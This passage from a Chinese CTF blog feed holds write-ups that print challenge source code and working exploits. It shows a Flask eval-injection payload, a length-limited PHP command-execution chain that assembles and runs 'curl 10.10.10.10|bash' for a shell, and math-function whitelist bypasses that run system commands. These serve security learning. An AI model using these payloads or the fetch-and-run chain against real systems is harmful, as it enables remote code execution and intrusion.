&gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][<span class="number">-5</span>:]</span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=None</span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = set(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = eval(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.format(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = open(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.format(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.format(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure><p>从<code> get_flag_handler</code>可以看出来得到flag的条件，也就是让<code>session[&#39;num_items&#39;] &gt;= 5:</code>满足。</p><p>接着跟进这个<code>num_items </code> ，在<code>buy_handler</code>里，对<code>num_items</code>先进行了加操作，再调用<code>consume_point_handler</code>判断是否足够，不够的话扣除掉<code>num_items</code>，这里就存在了一个明显的逻辑漏洞，我们如果能在，执行buy_handler结束，<code>consume_point_handle</code>r调用之前直接执行<code>get_flag_handler</code>，就可以拿到flag。</p><p>继续看源码，缕清执行顺序：</p><p><code>entry_point()</code>函数为入口，<code>querystring</code>是我们的传参</p><p>为了达成目的，我们需要主意两个重要的方法： <code>trigger_event(event) 和execute_event_loop()</code></p><p><code>trigger_event</code>传参进入<code>event_queue</code>然后在<code>execute_evenr_loop</code>中执行。</p><p><code>get_mid_str</code>函数的作用就是在第一个参数的字符串中截取第二个参数和第三个参数中间的字符串，如果第三个参数为空，则截取出字符串中第二个参数之后的所有字符。<br>以#为分隔符分隔event中的action，然后和_handler进行拼接，eval的作用是执行语句并返回结果，因为可以随意传递参数，所以我们可以利用这个拼接buy_handler函数和get_flag_handler函数，然后执行这些函数拿到flag。</p><blockquote><p>构造?action:trigger_event%23;action:buy;7%23action:get_flag;</p></blockquote><p>%23为#的urlencode，有注释作用，该payload传递之后，entry_point函数中的trigger_event(querystring)其实就是trigger_event(trigger_event)，然后trigger_event被传入event_queue，接下来在execute_event_loop中<code>eventaction:trigger_event#;action:buy;7#action:get_flag;</code>，到下面action为<code>trigger_event#，args[‘action:buy;7’, ‘action:get_flag;’]</code>，在eval中由于action中的#，所以<code>trigger_event</code>不会被拼接，所以<code>event_handler==trigger_event</code>，然后下面的<code>event_handler(args)</code>也就是<code>trigger_event(args)</code>，然后<code>action:buy;7</code>和<code>action:get_flag;</code>被append到event_queue中，然后就会在while循环中被eval拼接并先后执行<code>buy_handler</code>和<code>get_flag_handler</code>，而且买的是7个diamonds。</p><p>payload打进去之后，在cookie里面找到加密后的session，然后用脚本解密。</p><p><img src= "/img/loading.gif" data-lazy-src="1.png"></p><p>然后base64decode得到flag。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;知识点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;逻辑漏洞&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;flask session解密&lt;/p&gt;</summary>
    
    
    
    <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
    
    <category term="逻辑漏洞" scheme="http://yoursite.com/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
    <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>PHP各种姿势的RCE</title>
    <link href="http://yoursite.com/2020/04/22/%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84RCE/"/>
    <id>http://yoursite.com/2020/04/22/%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84RCE/</id>
    <published>2020-04-22T04:23:22.000Z</published>
    <updated>2020-04-22T08:02:55.285Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、限制长度的RCE"><a href="#1、限制长度的RCE" class="headerlink" title="1、限制长度的RCE"></a>1、限制长度的RCE</h2><p>以<strong>HITCON 2017 babyfirst-revenge</strong>为例，源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&quot;orange&quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen($_GET[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>源码很容易看，就限制长度嘛，干就完了。</p><a id="more"></a><blockquote><p>这里需要了解到一个Linux的小知识：&gt;file 命令可以创建一个名为file的文件 ls -t &lt;file 会将ls的结果写入file文件</p></blockquote><p>据此我们可以通过创建文件–&gt;输出文件列表–&gt;sh 执行的步骤进行RCE</p><p>这里还有一个小问题需要注意，在PHP中，ls的排序方式和Linux不太一样，PHP中特殊字符在字母之前。所以如果按照正常的顺序构造<strong>“ls -t&gt;y”</strong>的话，执行顺序就跟我们想象的不太一样了。</p><p>所以我们要先将ls写入之后确保ls在最前面执行。</p><p>如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># generate &#96;ls -t&gt;y&#96; file</span><br><span class="line">   &#39;&gt;ls\\&#39;, </span><br><span class="line">   &#39;ls&gt;_&#39;, </span><br><span class="line">   &#39;&gt;\ \\&#39;, </span><br><span class="line">   &#39;&gt;-t\\&#39;, </span><br><span class="line">   &#39;&gt;\&gt;y&#39;, </span><br><span class="line">   &#39;ls&gt;&gt;_&#39;,</span><br></pre></td></tr></table></figure><p>然后就是利用阶段，因为 <strong>ls -t</strong>是按照键入的顺序从最后到最前，所以需要将命令倒序破解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># generate &#39;curl 10.10.10.10|bash&#39;</span><br><span class="line">&#39;&gt;sh &#39;,</span><br><span class="line">&#39;&gt;ba\&#39;,</span><br><span class="line">&#39;&gt;|\&#39;,</span><br><span class="line">&#39;&gt;10\&#39;,</span><br><span class="line">&#39;&gt;10.\&#39;,</span><br><span class="line">&#39;&gt;10.\&#39;,</span><br><span class="line">&#39;&gt;0.\&#39;,</span><br><span class="line">&#39;&gt;1\&#39;,</span><br><span class="line">&#39;&gt; \&#39;,</span><br><span class="line">&#39;&gt;rl\&#39;,</span><br><span class="line">&#39;&gt;cu\&#39;,</span><br><span class="line"></span><br><span class="line"># exec</span><br><span class="line">&#39;sh _&#39;,</span><br><span class="line">&#39;sh y&#39;,</span><br></pre></td></tr></table></figure><p>执行”_”文件使弹shell的命令写入y文件，然后再执行y文件，成功getshell</p><p>参考链接：</p><p><a href="https://www.zhihu.com/question/273928679">https://www.zhihu.com/question/273928679</a></p><p><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h2 id="2、利用数学函数的RCE"><a href="#2、利用数学函数的RCE" class="headerlink" title="2、利用数学函数的RCE"></a>2、利用数学函数的RCE</h2><p>PHP中比较经典的利用数学函数RCE的题目有CISCN中的“love math”</p><p>在这里复现一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码很简单，就白名单bypass，干就完了。</p><p>在白名单中我们看到一个PHP中十分亮眼的函数<strong>base_convert</strong>，这个函数可以在任意的进制之间转换数字。有了这个函数，意味着我们就可以随意用36进制转换来构造任意的函数以达成我们的目的。</p><p>getshell的方法有很多，我们用其中一种，即GET方法getshell。首先我们要构造出<strong>_GET</strong>，因为要大写，所以不能用<strong>base_convert</strong>直接构造，我们用<strong>hex2bin</strong>转换一下，这个函数不在白名单中，可以用<strong>base_convert</strong>得到，即：</p><blockquote><p>base_ convert(37907361743,10,36) =&gt; “hex2bin”</p><p>dechex(1598506324) =&gt; “5f474554”</p><p>$pi=hex2bin(“5f474554”) =&gt; $pi=”_GET” //hex2bin将 - -串16进制数转换为二进制字符串</p><p>($$pi){pi}(($$pi){abs}) =&gt; ($_GET){pi}($_GET){abs} //{}可以代替[]</p><p>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</p></blockquote><p>即可getflag</p><p>这里还有另外一个方法，是在看另外一个大佬的文章时学到的，PHP有一个**getallheaders()**函数，这个函数可以获得HTTP头部信息，所以我们可以将命令放在header中，然后构造出getallheaders()函数来执行。</p><blockquote><p>base_ convert( 696468,10,36) =&gt;’exec’</p><p>$pi(8768397090111664438,10,30) =&gt;”getallheaders”</p><p>exec( getallheaders(){1})</p><p>header中：1:cat /flag</p></blockquote><p>或者嫌麻烦，直接构造一把梭也行</p><blockquote><p>//exec( ‘ hex2bin( dechex( 109270211257898))’) =&gt; exec(‘cat f*’)</p><p>($pi=base_ convert)(22950 ,23,34)($pi(76478043844 , 9 ,34)( dechex(109270211257898)))</p><p>//system( ‘cat’.dechex(16)^asinh^pi) =&gt; system(‘cat *’)</p><p>base_convert(1751504350 , 10 ,36)( base_ convert( 15941, 10,36). (dechex( 16)^asinh^pi))</p></blockquote><h2 id="3、无数字RCE"><a href="#3、无数字RCE" class="headerlink" title="3、无数字RCE"></a>3、无数字RCE</h2><p>ByteCTF2019里面有一道只使用函数名的RCE，直接康淘宝师傅的文章：</p><p><a href="http://0xdktb.top/2019/10/22/ByteCTF2019-boring-code/">http://0xdktb.top/2019/10/22/ByteCTF2019-boring-code/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1、限制长度的RCE&quot;&gt;&lt;a href=&quot;#1、限制长度的RCE&quot; class=&quot;headerlink&quot; title=&quot;1、限制长度的RCE&quot;&gt;&lt;/a&gt;1、限制长度的RCE&lt;/h2&gt;&lt;p&gt;以&lt;strong&gt;HITCON 2017 babyfirst-revenge&lt;/strong&gt;为例，源码如下：&lt;/p&gt;
